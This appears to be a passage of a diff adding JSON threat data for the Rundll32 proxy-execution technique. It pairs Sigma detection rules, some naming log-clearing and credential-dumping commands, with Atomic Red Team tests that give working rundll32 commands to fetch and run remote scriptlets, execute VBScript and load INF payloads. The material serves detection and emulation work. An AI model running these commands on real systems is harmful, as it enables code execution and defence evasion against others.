+                            "raw": "author: '@41thexplorer, Microsoft Defender ATP'\ndate: 2018/11/20\ndescription: A sigma rule detecting an unidetefied attacker who used phishing emails\n  to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29\n  campaign in 2016.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: cyzfc.dat,\n    CommandLine|endswith: PointFunctionCall\nid: 7453575c-a747-40b9-839b-125a0aae324b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/19\nreferences:\n- https://twitter.com/DrunkBinary/status/1063075530180886529\nstatus: stable\ntags:\n- attack.execution\n- attack.t1218.011\ntitle: Unidentified Attacker November 2018\n",
+                            "sigma:id": "7453575c-a747-40b9-839b-125a0aae324b",
+                            "title": "Unidentified Attacker November 2018",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6812a10b-60ea-420c-832f-dfcc33b646ba",
+                        "lookup_data": {
+                            "description": "Detects potential PowerShell execution from a DLL instead of the usual PowerShell process as seen used in PowerShdll",
+                            "raw": "author: Markus Neis, Nasreddine Bencherchali\ndate: 2018/08/25\ndescription: Detects potential PowerShell execution from a DLL instead of the usual\n  PowerShell process as seen used in PowerShdll\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - Default.GetString\n    - FromBase64String\n    - Invoke-Expression\n    - 'IEX '\n    - Invoke-Command\n    - 'ICM '\n    - DownloadString\n  selection_img:\n  - Image|endswith:\n    - \\rundll32.exe\n    - \\regsvcs.exe\n    - \\InstallUtil.exe\n    - \\regasm.exe\n  - OriginalFileName:\n    - RUNDLL32.EXE\n    - RegSvcs.exe\n    - InstallUtil.exe\n    - RegAsm.exe\nfalsepositives:\n- Unknown\nid: 6812a10b-60ea-420c-832f-dfcc33b646ba\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nreferences:\n- https://github.com/p3nt4/PowerShdll/blob/62cfa172fb4e1f7f4ac00ca942685baeb88ff356/README.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Potential PowerShell Execution Via DLL\n",
+                            "sigma:id": "6812a10b-60ea-420c-832f-dfcc33b646ba",
+                            "title": "Potential PowerShell Execution Via DLL",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ba778144-5e3d-40cf-8af9-e28fb1df1e20",
+                        "lookup_data": {
+                            "description": "Detects Trojan loader activity as used by APT28",
+                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2018/03/01\ndescription: Detects Trojan loader activity as used by APT28\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - '%APPDATA%\\'\n  selection2:\n  - CommandLine|contains: .dat\",\n  - CommandLine|endswith:\n    - .dll\",#1\n    - '.dll #1'\n    - '.dll\" #1'\nfalsepositives:\n- Unknown\nid: ba778144-5e3d-40cf-8af9-e28fb1df1e20\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/07\nreferences:\n- https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/\n- https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100\n- https://twitter.com/ClearskySec/status/960924755355369472\nstatus: test\ntags:\n- attack.g0007\n- attack.execution\n- attack.t1059.003\n- attack.defense_evasion\n- car.2013-10-002\n- attack.t1218.011\ntitle: Sofacy Trojan Loader Activity\n",
+                            "sigma:id": "ba778144-5e3d-40cf-8af9-e28fb1df1e20",
+                            "title": "Sofacy Trojan Loader Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "285b85b1-a555-4095-8652-a8a4106af63f",
+                        "lookup_data": {
+                            "description": "setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.",
+                            "raw": "author: Konstantin Grishchenko, oscd.community\ndate: 2020/10/07\ndescription: setupapi.dll library provide InstallHinfSection function for processing\n  INF files. INF file may contain instructions allowing to create values in the registry,\n  modify files and install drivers. This technique could be used to obtain persistence\n  via modifying one of Run or RunOnce registry keys, run process or use other DLLs\n  chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe\n  executable regardless of actual content of INF file.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\runonce.exe\n    ParentCommandLine|contains|all:\n    - setupapi.dll\n    - InstallHinfSection\n    ParentImage|endswith: \\rundll32.exe\nfalsepositives:\n- Scripts and administrative tools that use INF files for driver installation with\n  setupapi.dll\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 285b85b1-a555-4095-8652-a8a4106af63f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/Libraries/Setupapi/\n- https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf\n- https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf\n- https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Rundll32 Setupapi.dll Activity\n",
+                            "sigma:id": "285b85b1-a555-4095-8652-a8a4106af63f",
+                            "title": "Suspicious Rundll32 Setupapi.dll Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d7eb979b-c2b5-4a6f-a3a7-c87ce6763819",
+                        "lookup_data": {
+                            "description": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/04/15\ndescription: Detects suspicious Rundll32 execution from control.exe as used by Equation\n  Group and Exploit Kits\ndetection:\n  condition: selection and not filter\n  filter:\n    CommandLine|contains: Shell32.dll\n  selection:\n    Image|endswith: '\\rundll32.exe '\n    ParentImage|endswith: \\System32\\control.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: d7eb979b-c2b5-4a6f-a3a7-c87ce6763819\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/rikvduijn/status/853251879320662017\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Suspicious Control Panel DLL Load\n",
+                            "sigma:id": "d7eb979b-c2b5-4a6f-a3a7-c87ce6763819",
+                            "title": "Suspicious Control Panel DLL Load",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "79aeeb41-8156-4fac-a0cd-076495ab82a1",
+                        "lookup_data": {
+                            "description": "Detects NotPetya ransomware activity in which the extracted passwords are passed back to the main module via named pipe, the file system journal of drive C is deleted and windows eventlogs are cleared using wevtutil",
+                            "raw": "author: Florian Roth (Nextron Systems), Tom Ueltschi\ndate: 2019/01/16\ndescription: Detects NotPetya ransomware activity in which the extracted passwords\n  are passed back to the main module via named pipe, the file system journal of drive\n  C is deleted and windows eventlogs are cleared using wevtutil\ndetection:\n  condition: 1 of selection*\n  selection_pattern:\n    CommandLine|contains:\n    - 'wevtutil cl Application & fsutil usn deletejournal /D C:'\n    - dllhost.dat %WINDIR%\\ransoms\n  selection_perfc_keyword:\n  - \\perfc.dat\n  selection_rundll32_dash1:\n    CommandLine|endswith:\n    - .dat,#1\n    - '.dat #1'\n    - .zip.dll\",#1\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 79aeeb41-8156-4fac-a0cd-076495ab82a1\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/15\nreferences:\n- https://securelist.com/schroedingers-petya/78870/\n- https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.t1070.001\n- attack.credential_access\n- attack.t1003.001\n- car.2016-04-002\ntitle: NotPetya Ransomware Activity\n",
+                            "sigma:id": "79aeeb41-8156-4fac-a0cd-076495ab82a1",
+                            "title": "NotPetya Ransomware Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3d4aebe0-6d29-45b2-a8a4-3dfde586a26d",
+                        "lookup_data": {
+                            "description": "Detects Archer malware invocation via rundll32",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/06/03\ndescription: Detects Archer malware invocation via rundll32\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - InstallArcherSvc\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 3d4aebe0-6d29-45b2-a8a4-3dfde586a26d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/\n- https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Fireball Archer Install\n",
+                            "sigma:id": "3d4aebe0-6d29-45b2-a8a4-3dfde586a26d",
+                            "title": "Fireball Archer Install",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "54e57ce3-0672-46eb-a402-2c0948d5e3e9",
+                        "lookup_data": {
+                            "description": "Detecting Emotet DLL loading by looking for rundll32.exe processes with command lines ending in ,RunDLL or ,Control_RunDLL",
+                            "raw": "author: FPT.EagleEye\ndate: 2020/12/25\ndescription: Detecting Emotet DLL loading by looking for rundll32.exe processes with\n  command lines ending in ,RunDLL or ,Control_RunDLL\ndetection:\n  condition: selection and not filter_ide and not filter_legitimate_dll\n  filter_ide:\n    ParentImage|endswith: \\tracker.exe\n  filter_legitimate_dll:\n    CommandLine|endswith:\n    - .dll,Control_RunDLL\n    - .dll\",Control_RunDLL\n    - .dll',Control_RunDLL\n  selection:\n    CommandLine|endswith:\n    - ',RunDLL'\n    - ',Control_RunDLL'\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 54e57ce3-0672-46eb-a402-2c0948d5e3e9\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/17\nreferences:\n- https://paste.cryptolaemus.com/emotet/2020/12/22/emotet-malware-IoCs_12-22-20.html\n- https://cyber.wtf/2021/11/15/guess-whos-back/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Emotet RunDLL32 Process Creation\n",
+                            "sigma:id": "54e57ce3-0672-46eb-a402-2c0948d5e3e9",
+                            "title": "Emotet RunDLL32 Process Creation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
+                        "lookup_data": {
+                            "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
+                            "raw": "author: Wojciech Lesicki\ndate: 2021/06/01\ndescription: Rundll32 can be use by Cobalt Strike with StartW function to load DLLs\n  from the command line.\ndetection:\n  condition: all of selection*\n  selection_params:\n    CommandLine|contains: .dll\n    CommandLine|endswith:\n    - ' StartW'\n    - ',StartW'\n  selection_rundll:\n  - Image|endswith: \\rundll32.exe\n  - OriginalFileName: RUNDLL32.EXE\n  - CommandLine|contains:\n    - rundll32.exe\n    - 'rundll32 '\nfalsepositives:\n- Unknown\nid: ae9c6a7c-9521-42a6-915e-5aaa8689d529\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/16\nreferences:\n- https://www.cobaltstrike.com/help-windows-executable\n- https://redcanary.com/threat-detection-report/\n- https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: CobaltStrike Load by Rundll32\n",
+                            "sigma:id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
+                            "title": "CobaltStrike Load by Rundll32",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
+                        "lookup_data": {
+                            "description": "Detects process memory dump via comsvcs.dll and rundll32",
+                            "raw": "author: Modexp (idea)\ndate: 2019/09/02\ndescription: Detects process memory dump via comsvcs.dll and rundll32\ndetection:\n  condition: (rundll_image or rundll_ofn) and selection\n  rundll_image:\n    Image|endswith: \\rundll32.exe\n  rundll_ofn:\n    OriginalFileName: RUNDLL32.EXE\n  selection:\n    CommandLine|contains|all:\n    - comsvcs\n    - MiniDump\n    - full\nfalsepositives:\n- unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/09/05\nreferences:\n- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n- https://twitter.com/SBousseaden/status/1167417096374050817\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003\ntitle: Process Dump via Comsvcs DLL\n",
+                            "sigma:id": "09e6d5c0-05b8-4ff8-9eeb-043046ec774c",
+                            "title": "Process Dump via Comsvcs DLL",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
+                        "lookup_data": {
+                            "description": "Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/02/10\ndescription: Detects a possible process memory dump that uses the white-listed Citrix\n  TrolleyExpress.exe filename as a way to dump the lsass process memory\ndetection:\n  condition: selection or ( renamed and not 1 of filter* )\n  filter_empty:\n    OriginalFileName: null\n  filter_renamed:\n    OriginalFileName|contains: CtxInstall\n  renamed:\n    Image|endswith: \\TrolleyExpress.exe\n  selection:\n    CommandLine|contains:\n    - \\TrolleyExpress 7\n    - \\TrolleyExpress 8\n    - \\TrolleyExpress 9\n    - \\TrolleyExpress.exe 7\n    - \\TrolleyExpress.exe 8\n    - \\TrolleyExpress.exe 9\n    - '\\TrolleyExpress.exe -ma '\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 4c0aaedc-154c-4427-ada0-d80ef9c9deb6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://twitter.com/_xpn_/status/1491557187168178176\n- https://www.youtube.com/watch?v=Ie831jF0bb0\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.credential_access\n- attack.t1003.001\ntitle: Process Access via TrolleyExpress Exclusion\n",
+                            "sigma:id": "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
+                            "title": "Process Access via TrolleyExpress Exclusion",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c048f047-7e2a-4888-b302-55f509d4a91d",
+                        "lookup_data": {
+                            "description": "An attacker may execute an application as a .SCR File (Screensaver) using rundll32.exe desk.cpl,InstallScreenSaver",
+                            "raw": "author: Christopher Peacock @securepeacock, SCYTHE @scythe_io\ndate: 2022/04/27\ndescription: An attacker may execute an application as a .SCR File (Screensaver) using\n  rundll32.exe desk.cpl,InstallScreenSaver\ndetection:\n  condition: selection and not filter\n  filter:\n    TargetFilename|startswith:\n    - C:\\Windows\\System32\\\n    - C:\\Windows\\SysWOW64\\\n    - C:\\Windows\\WinSxS\\\n    - C:\\$WINDOWS.~BT\\NewOS\\\n  selection:\n    TargetFilename|endswith: .scr\nfalsepositives:\n- The installation of new screen savers.\nid: c048f047-7e2a-4888-b302-55f509d4a91d\nlevel: medium\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/11/28\nreferences:\n- https://lolbas-project.github.io/lolbas/Libraries/Desk/\nstatus: experimental\ntags:\n- attack.t1218.011\n- attack.defense_evasion\ntitle: SCR File Write Event\n",
+                            "sigma:id": "c048f047-7e2a-4888-b302-55f509d4a91d",
+                            "title": "SCR File Write Event",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8acf3cfa-1e8c-4099-83de-a0c4038e18f0",
+                        "lookup_data": {
+                            "description": "Detects Golden Chickens deployment method as used by Evilnum in report published in July 2020",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/10\ndescription: Detects Golden Chickens deployment method as used by Evilnum in report\n  published in July 2020\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - regsvr32\n    - /s\n    - /i\n    - \\AppData\\Roaming\\\n    - .ocx\nfalsepositives:\n- Unknown\nid: 8acf3cfa-1e8c-4099-83de-a0c4038e18f0\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/\n- https://app.any.run/tasks/33d37fdf-158d-4930-aa68-813e1d5eb8ba/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: EvilNum Golden Chickens Deployment via OCX Files\n",
+                            "sigma:id": "8acf3cfa-1e8c-4099-83de-a0c4038e18f0",
+                            "title": "EvilNum Golden Chickens Deployment via OCX Files",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
+                        "lookup_data": {
+                            "description": "Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library.",
+                            "raw": "author: Julia Fomina, oscd.community\ndate: 2020/10/05\ndescription: Detects launch of executable by calling the LaunchApplication function\n  from pcwutl.dll library.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - pcwutl\n    - LaunchApplication\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Use of Program Compatibility Troubleshooter Helper\nid: 9386d78a-7207-4048-9c9f-a93a7c2d1c05\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/\n- https://twitter.com/harr0ey/status/989617817849876488\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.011\ntitle: Code Execution via Pcwutl.dll\n",
+                            "sigma:id": "9386d78a-7207-4048-9c9f-a93a7c2d1c05",
+                            "title": "Code Execution via Pcwutl.dll",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "15bd98ea-55f4-4d37-b09a-e7caa0fa2221",
+                        "lookup_data": {
+                            "description": "An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver",
+                            "raw": "author: Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec\ndate: 2022/04/28\ndescription: An attacker may execute an application as a SCR File using rundll32.exe\n  desk.cpl,InstallScreenSaver\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains: InstallScreenSaver\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Legitimate installation of a new screensaver\nid: 15bd98ea-55f4-4d37-b09a-e7caa0fa2221\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://lolbas-project.github.io/lolbas/Libraries/Desk/\nstatus: experimental\ntags:\n- attack.t1218.011\n- attack.defense_evasion\ntitle: Rundll32 InstallScreenSaver Execution\n",
+                            "sigma:id": "15bd98ea-55f4-4d37-b09a-e7caa0fa2221",
+                            "title": "Rundll32 InstallScreenSaver Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "99b97608-3e21-4bfe-8217-2a127c396a0e",
+                        "lookup_data": {
+                            "description": "Detects PowerShell remote thread creation in Rundll32.exe",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/06/25\ndescription: Detects PowerShell remote thread creation in Rundll32.exe\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    TargetImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 99b97608-3e21-4bfe-8217-2a127c396a0e\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.011\n- attack.t1059.001\ntitle: PowerShell Rundll32 Remote Thread Creation\n",
+                            "sigma:id": "99b97608-3e21-4bfe-8217-2a127c396a0e",
+                            "title": "PowerShell Rundll32 Remote Thread Creation",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1218.011",
+                "display_name": "Signed Binary Proxy Execution: Rundll32",
+                "atomic_tests": [
+                    {
+                        "name": "Rundll32 execute JavaScript Remote Payload With GetObject",
+                        "auto_generated_guid": "57ba4ce9-ee7a-4f27-9928-3c70c489b59d",
+                        "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_url": {
+                                "description": "location of the payload",
+                                "type": "url",
+                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n",
+                            "cleanup_command": "taskkill /IM notepad.exe /f\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 execute VBscript command",
+                        "auto_generated_guid": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
+                        "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "command_to_execute": {
+                                "description": "Command for rundll32.exe to execute",
+                                "type": "string",
+                                "default": "calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 execute VBscript command using Ordinal number",
+                        "auto_generated_guid": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821",
+                        "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "command_to_execute": {
+                                "description": "Command for rundll32.exe to execute",
+                                "type": "string",
+                                "default": "calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 advpack.dll Execution",
+                        "auto_generated_guid": "d91cae26-7fc1-457b-a854-34c8aad48c89",
+                        "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "inf_to_execute": {
+                                "description": "Local location of inf file",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+                                "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe advpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 ieadvpack.dll Execution",
+                        "auto_generated_guid": "5e46a58e-cbf6-45ef-a289-ed7754603df9",
+                        "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "inf_to_execute": {
+                                "description": "Local location of inf file",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+                                "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 syssetup.dll Execution",
+                        "auto_generated_guid": "41fa324a-3946-401e-bbdd-d7991c628125",
+                        "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "inf_to_execute": {
+                                "description": "Local location of inf file",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+                                "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"#{inf_to_execute}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Rundll32 setupapi.dll Execution",
+                        "auto_generated_guid": "71d771cd-d6b3-4f34-bc76-a63d47a10b19",
+                        "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "inf_to_execute": {
+                                "description": "Local location of inf file",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
+                                "prereq_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Execution of HTA and VBS Files using Rundll32 and URL.dll",
+                        "auto_generated_guid": "22cfde89-befe-4e15-9753-47306b37a6e3",
